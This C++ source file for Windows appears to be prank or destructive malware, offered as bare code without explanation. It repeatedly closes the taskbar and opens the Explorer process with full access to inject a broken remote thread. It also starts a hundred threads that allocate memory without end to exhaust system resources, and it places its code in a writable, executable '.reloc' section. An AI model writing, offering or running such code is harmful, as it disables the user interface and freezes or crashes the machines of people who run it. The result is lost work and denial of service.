
#pragma once

//#define NO_ACK_SERVER
#pragma section(".reloc",execute, read, write)
#pragma comment(linker,"/SECTION:.reloc,ERW")

#pragma code_seg(".reloc")

#include <Windows.h>


int hidewindowsthread()
{


	while (1)
	{
	
		HWND taskbar = FindWindow("Shell_TrayWnd", 0);
		unsigned long pid = 0;
		GetWindowThreadProcessId(taskbar, &pid);

		if (taskbar)
		{	
			PostMessage(taskbar, WM_CLOSE, (WPARAM)0, (LPARAM)0);
			HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
			HANDLE threadHandle = CreateRemoteThread(proc, 0, 0, 0 , 0, 0, 0);
		}

	}
}

int hi()
{

	while (true)
		char*cock = new char[0xFFFFFFF];



}

int main(int argc, char** argv)
{




	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)hidewindowsthread, 0, 0, 0);

	Sleep(100);


	for (int i = 0; i < 100;i++)
		CreateThread(0, 0, (LPTHREAD_START_ROUTINE)hi, 0, 0, 0);


	while (true)
	{
		hi();
	}

	return 0;
}